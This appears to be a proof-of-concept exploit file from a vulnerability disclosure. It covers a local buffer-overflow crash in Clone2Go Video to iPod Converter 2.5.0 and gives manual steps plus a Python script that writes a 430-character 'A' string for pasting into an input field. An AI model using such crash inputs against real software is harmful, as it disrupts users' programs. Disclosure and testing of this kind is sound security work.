@@ -1,0 +1,32 @@
+# Exploit Title: Clone2Go Video to iPod Converter 2.5.0 - Denial of Service (PoC)
+# Exploit Author: ZwX
+# Exploit Date: 2018-09-11
+# Vendor Homepage : http://www.clone2go.com/
+# Software Link: http://www.clone2go.com/down/video-to-ipod-setup.exe
+# Tested on OS: Windows 7 
+
+# Proof of Concept (PoC):
+# The local buffer overflow vulnerability can be exploited by local attackers with 
+# restricted system user account without user interaction. For security demonstration 
+# or to reproduce follow the provided information and steps below to continue.
+
+# Manual steps to reproduce the vulnerability ...
+# 1 Install the software and start the client
+# 2 Copy  the AAAA...string from bof.txt to clipboard
+# 3 Run VideoConverter.exex
+# 4 Go Menu Menu > Edit > Options > Set Output folder (Input)
+# 5 Paste it the input AAAA....string and click Open
+# 6 A messagebox opens click ok
+# 7 Software will stable crash or shut down
+# 8 Successful reproduce of the Denial of Service
+
+#!/usr/bin/python
+
+buffer = "\x41" * 430
+
+poc = buffer
+file = open("poc.txt","w")
+file.write(poc)
+file.close()
+ 
+print "POC Created by ZwX"
